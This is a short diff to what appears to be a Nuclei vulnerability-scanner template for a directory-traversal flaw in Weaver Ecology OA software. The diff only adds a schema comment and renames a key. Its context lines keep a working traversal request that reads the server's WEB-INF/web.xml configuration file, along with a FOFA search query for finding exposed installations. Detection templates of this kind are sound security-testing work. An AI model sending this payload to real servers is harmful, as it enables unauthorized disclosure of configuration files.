@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ecology-filedownload-directory-traversal
 info:
   name: Ecology Directory Traversal
@@ -6,7 +7,7 @@ info:
   metadata:
     fofa-query: app="泛微-协同办公OA"
   tags: ecology,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
